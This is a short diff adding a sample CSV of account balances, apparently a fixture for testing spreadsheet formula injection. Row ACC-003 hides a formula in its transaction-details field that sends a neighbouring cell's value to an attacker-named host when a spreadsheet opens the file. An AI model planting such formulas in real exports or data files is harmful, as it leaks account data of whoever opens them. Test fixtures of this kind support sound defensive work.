@@ -1,0 +1,5 @@
+AccountID,Balance,Currency,LastTransactionDetails
+ACC-001,1500.00,USD,Deposit
+ACC-002,-250.50,USD,Withdrawal Fee
+ACC-003,5000.00,EUR,"+IMPORTXML(CONCATENATE(""http://attacker-forex.com/?acc="",A4),""//rate"")"
+ACC-004,100.00,USD,Interest Payment
